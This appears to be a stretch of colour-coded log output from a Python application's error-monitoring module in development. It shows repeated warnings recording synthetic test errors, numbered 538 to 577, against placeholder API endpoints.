WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.712846Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 538'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m538[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.712895Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 539'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m539[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.712945Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 540'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m540[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.712996Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 541'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m541[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.713046Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 542'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m542[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.713096Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 543'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m543[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.713144Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 544'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m544[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.713192Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 545'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m545[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.713240Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 546'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m546[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.713289Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 547'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m547[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.713337Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 548'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m548[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.713385Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m11[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 549'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m549[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.713434Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 550'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m550[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.713481Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 551'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m551[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.713529Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 552'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m552[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.713576Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 553'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m553[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.713623Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 554'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m554[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.713670Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 555'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m555[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.713717Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 556'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m556[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.713764Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 557'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m557[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.713812Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 558'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m558[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.713860Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 559'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m559[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.713912Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 560'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m560[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.713959Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 561'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m561[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.714007Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 562'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m562[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.714072Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 563'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m563[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.714125Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 564'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m564[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.714172Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 565'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m565[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.714230Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 566'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m566[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.714278Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 567'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m567[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.714363Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 568'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m568[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.714440Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 569'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m569[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.714498Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 570'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m570[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.714550Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 571'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m571[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.714600Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 572'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m572[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.714650Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 573'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m573[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.714698Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 574'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m574[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.714793Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 575'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m575[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.714865Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 576'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m576[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.714920Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 577'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m577[0m
